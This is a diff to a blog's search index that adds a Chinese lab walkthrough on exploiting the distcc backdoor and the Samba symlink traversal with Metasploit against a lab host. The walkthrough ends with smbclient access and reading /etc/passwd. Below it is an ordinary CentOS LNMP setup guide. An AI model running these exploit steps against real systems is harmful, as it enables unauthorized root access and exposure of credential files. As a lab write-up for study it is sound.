@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Distcc后门漏洞 && Samba sysmlink默认配置目录遍历漏洞]]></title>
+    <url>%2F2018%2F08%2F19%2FDistcc%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-Samba-sysmlink%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[Distcc后门漏洞【目的】利用Distcc后门漏洞获取目标主机的root权限。 【原理】Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制 【步骤】1234567891.在kali中执行msfconsole，启动metasploit 2use exploit/unix/misc/distcc_exec #选择漏洞show options #显示需要设置的参数set RHOST 192.168.199.126 #设置要攻击的靶机IPexploit #开始攻击 2.执行id 查看权限，uname -a 验证服务器信息。 Samba sysmlink默认配置目录遍历漏洞Samba是linux和unix系统上实现smb协议的一个免费软件，由客户机和服务器构成。 SMB是一种在局域网上实现共享文件和打印机的协议。存在一个服务器，客户机通过该协议可以服务器上的共享文件系统和打印机以及其他的资源。通过设置，还可以和全世界的电脑分享资源 : 【步骤】1234567891.在kali中执行msfconsole，启动metasploit2use auxiliary/admin/smb/samba_symlink_traversal #选择漏洞set RHOST 192.168.199.126 #设置要攻击的靶机IPset SMBSHARE tmp #设置SAM可写文件exploit #开始攻击 2.在新的终端下执行smbclient命令打开上面生成的共享目录12345smbclient //192.168.199.126/tmpcd rootfsls 3.列出密码1more /etc/passwd #列出密码文件，可用成功。]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>metasploit 2</tag>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CentOS 下 LNMP 环境配置（yum安装）]]></title>
     <url>%2F2018%2F08%2F15%2FCentOS-%E4%B8%8B-LNMP-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88yum%E5%AE%89%E8%A3%85%EF%BC%89%2F</url>
     <content type="text"><![CDATA[前言LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。 Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。 Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。 Mysql是一个小型关系型数据库管理系统。 PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。 这四种软件均为免费开源软件，组合到一起，成为一个免费、高效、扩展性强的网站服务系统。 安装配置 Nginx自动安装 Nginx。输入命令：12yum install nginx systemctl start nginx 浏览器中测试 Nginx 服务是否正常运行。访问 CentOS 云服务器公网 IP。 安装配置 MySQL注意： 从 CentOS 7 系统开始，MariaDB 成为 yum 源中默认的数据库安装包。在 CentOS 7 及以上的系统中使用 yum 安装 MySQL 包将无法使用 MySQL。您可以选择使用完全兼容的 MariaDB，或自行安装较低版本的 MySQL。 安装 MySQL。输入以下命令：1yum install mariadb mariadb-server 启动 MySQL 服务。1systemctl start mariadb.service 登录 MySQL ，删除空用户12MariaDB [(none)]&gt; select user,host,password from mysql.user;MariaDB [(none)]&gt; select user,host,password from mysql.user; 修改 root 密码。12MariaDB [(none)]&gt; update mysql.user set password = (&apos;toor&apos;) where user=&apos;root&apos;MariaDB [(none)]&gt; flush privileges; 安装配置 PHP安装 PHP 。输入命令进行安装：1yum install php lighttpd-fastcgi php-cli php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-mssql php-snmp php-soap 安装所需组件使 PHP 支持 MySQL、FastCGI 模式。1yum install php-tidy php-common php-devel php-fpm php-mysql Nginx 与 PHP-FPM 集成启动 PHP-FPM。输入命令启动 PHP-FPM 服务1service php-fpm start 。 输入命令查看 PHP-FPM 默认配置1cat /etc/php-fpm.d/www.conf |grep -i &apos;listen =&apos; 返回结果为：listen = 127.0.0.1:9000，表明 PHP-FPM 默认配置的监听端口为 9000，只需修改配置，将 PHP 解析的请求转发到 127.0.0.0:9000 处理即可。 修改 Nginx 配置。 输入命令查找 Nginx 配置文件1nginx -t 使用vi命令修改该配置文件：1vim /etc/nginx/nginx.conf 修改红框里面的内容。 配置完成后，重启服务。1systemctl restart nginx 环境配置验证 用以下命令在 web 目录下创建 index.php：123vim /usr/share/nginx/html/index.php&lt;?php echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;; echo &quot;hello world&quot;; ?&gt; 验证：在浏览器中输入服务器ip:index.php，出现hello world页面，说明配置成功。]]></content>
